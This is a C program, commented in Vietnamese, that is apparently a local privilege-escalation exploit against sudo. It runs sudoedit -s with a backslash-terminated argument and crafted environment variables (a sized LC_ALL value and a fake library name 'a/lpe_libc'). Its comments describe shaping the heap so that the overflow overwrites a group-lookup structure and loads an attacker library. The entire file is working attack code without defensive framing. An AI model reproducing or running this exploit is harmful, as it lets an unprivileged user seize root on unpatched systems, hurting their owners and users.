#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	char *try_smash=NULL;

	try_smash = calloc(200,1);
	memset(try_smash,'a',110); // 110: kích thước để được re-malloc() khối 0x80
	try_smash[110]='\\';

	char *s_argv[] = {"/usr/bin/sudoedit", "-s", try_smash, NULL};

	char *s_envp[512] ;
	int i = 0;
	int lc_len = 208; // kích thước biến LC_ALL: 208 để được 1 khối 0xe0 trên unsorted-bin

	char *lc_all = calloc(lc_len + 16, 1);
    strcpy(lc_all, "LC_ALL=C.UTF-8@");
    memset(lc_all+15, 'C', lc_len);
	
	for(;i<65;i++){
		s_envp[i] = "\\";	
	}
	s_envp[i++] = "a/lpe_libc" ; // tên thư viện fake sẽ làm tràn lên struct của group
	s_envp[i++] = lc_all;
	s_envp[i] = NULL;

    execve("/usr/bin/sudoedit", s_argv, s_envp);
    return 0;
}